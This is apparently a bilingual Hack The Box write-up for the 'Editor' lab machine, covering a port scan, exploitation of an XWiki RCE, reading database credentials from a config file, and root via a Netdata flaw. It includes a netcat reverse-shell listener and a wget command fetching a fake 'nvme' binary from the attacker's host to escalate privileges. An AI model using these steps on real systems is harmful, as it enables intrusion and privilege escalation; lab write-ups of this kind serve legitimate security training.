# Editor HTB - Writeup

## Escaneamento de portas

``` bash
./malwaricon.sh
Enter domain: 10.10.11.80
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
9999/tcp open  abyss?
```

...

## Exploração do CVE-2025-24893 (XWiki RCE)

Foi encontrado o CVE: https://github.com/Artemir7/CVE-2025-24893-EXP

Execução bem-sucedida:

``` bash
python CVE-2025-24893.py -u http://wiki.editor.htb -c whoami
[+] Command Output:
xwiki
```

Reverse shell enviada:

``` bash
nc -lvnp 4444
```

## Credenciais do banco de dados

No arquivo `/etc/wiki/hibernate.cfg.xml` foram encontradas credenciais:

    username: xwiki
    password: theEd1t0rTeam99

## Acesso inicial como Oliver

``` bash
oliver@editor:~$ cat user.txt
2739c3049d79c4f20eff7db04ea331f7
```

## Escalada de privilégios via Netdata

A porta 19999 estava rodando **Netdata**. Após abrir um túnel SSH e
acessar a interface web, foi identificado que a versão era vulnerável ao
CVE-2024-32019.

Exploração com binário falso `nvme`:

``` bash
wget http://10.10.15.14:5000/nvme
chmod +x nvme
```

------------------------------------------------------------------------

------------------------------------------------------------------------

# Editor HTB - Writeup (English)

## Port Scan

``` bash
nmap -sV 10.10.11.80
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
9999/tcp open  abyss?
```

## Exploitation of CVE-2025-24893 (XWiki RCE)

Found CVE: https://github.com/Artemir7/CVE-2025-24893-EXP

Successful execution:

``` bash
python CVE-2025-24893.py -u http://wiki.editor.htb -c whoami
[+] Command Output:
xwiki
```

Reverse shell payload:

``` bash
nc -lvnp 4444
```

## Database credentials

Found in `/etc/wiki/hibernate.cfg.xml`:

    username: xwiki
    password: theEd1t0rTeam99

## Initial access as Oliver

``` bash
oliver@editor:~$ cat user.txt
2739c3049d79c4f20eff7db04ea331f7
```

## Privilege Escalation via Netdata

Port 19999 was running **Netdata**. After tunneling SSH and accessing
the web UI, it was identified as vulnerable to CVE-2024-32019.

Exploit using fake `nvme` binary:

``` bash
wget http://10.10.15.14:5000/nvme
chmod +x nvme
```

------------------------------------------------------------------------
